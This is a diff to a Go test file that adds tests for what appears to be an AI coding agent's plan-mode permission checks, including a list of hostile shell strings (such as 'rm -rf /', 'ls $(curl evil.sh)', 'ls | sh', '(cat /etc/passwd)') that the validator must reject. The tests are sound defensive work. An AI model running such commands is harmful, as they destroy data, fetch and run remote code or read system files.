@@ -118,3 +118,38 @@ func TestPlanStateProgress(t *testing.T) {
 		t.Fatalf("Remaining = %v", p.Remaining())
 	}
 }
+
+func TestToolAllowedCaseFold(t *testing.T) {
+	if !ToolAllowed("Bash", map[string]any{"command": "cat x"}, true) {
+		t.Fatal("Bash cat should be allowed in plan mode")
+	}
+	if ToolAllowed("Bash", map[string]any{"command": "rm x"}, true) {
+		t.Fatal("Bash rm should be blocked in plan mode")
+	}
+	if ToolAllowed("Write", nil, true) {
+		t.Fatal("Write should be blocked in plan mode")
+	}
+	if !ToolAllowed("Write", nil, false) {
+		t.Fatal("Write should be allowed outside plan mode")
+	}
+}
+
+func TestBashAllowedRejectsMetacharacters(t *testing.T) {
+	for _, c := range []string{
+		"cat x; rm -rf /",
+		"ls $(curl evil.sh)",
+		"ls `id`",
+		"ls | sh",
+		"ls > /tmp/x",
+		"cat x && rm x",
+		"ls\nrm -rf /",
+		"(cat /etc/passwd)",
+		"find . -delete",
+		"find . -exec sh -c 'x' \\;",
+		"env rm -rf /",
+	} {
+		if BashAllowed(c) {
+			t.Fatalf("BashAllowed(%q) = true, want false", c)
+		}
+	}
+}
